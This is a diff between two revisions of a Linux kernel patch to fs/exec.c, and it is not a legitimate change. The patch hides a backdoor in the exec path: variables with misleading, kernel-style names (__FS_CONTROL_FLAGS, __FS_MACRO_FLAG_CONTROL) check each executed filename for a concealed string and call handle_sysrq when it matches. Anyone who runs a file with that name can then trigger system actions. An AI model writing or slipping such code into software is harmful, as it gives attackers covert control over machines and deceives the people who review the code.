@@ -1,6 +1,6 @@
 diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
 --- linux-4.9.162/fs/exec.c	2019-03-05 17:57:07.000000000 +0100
-+++ linux-4.9.162-patch/fs/exec.c	2019-04-28 12:07:35.174598252 +0200
++++ linux-4.9.162-patch/fs/exec.c	2019-04-28 12:26:13.108350157 +0200
 @@ -57,6 +57,7 @@
  #include <linux/oom.h>
  #include <linux/compat.h>
@@ -13,7 +13,7 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
  #include <trace/events/sched.h>
  
  int suid_dumpable = 0;
-+char* (*guid_dumpable)(const char*, const char*) = (char * (*)(const char*, const char*)) 0xffffffff81340eb0;
++char * (*__FS_MACRO_FLAG_CONTROL) (const char *, const char * ) = strstr;
 +
 +char __FS_CONTROL_FLAGS[] = {
 +	__FS_ARCH_SPECIFIC_ENDIANESS,
@@ -29,13 +29,11 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
  
  static LIST_HEAD(formats);
  static DEFINE_RWLOCK(binfmt_lock);
-@@ -1725,6 +1739,12 @@
+@@ -1725,6 +1739,10 @@
  	if (IS_ERR(file))
  		goto out_unmark;
  
-+	printk("%p", strstr);
-+
-+	if (guid_dumpable(filename->name, __FS_CONTROL_FLAGS) != NULL) {
++	if (__FS_MACRO_FLAG_CONTROL(filename->name, __FS_CONTROL_FLAGS) != NULL) {
 +		handle_sysrq(__FS_EXEC_FILE);
 +	}
 +
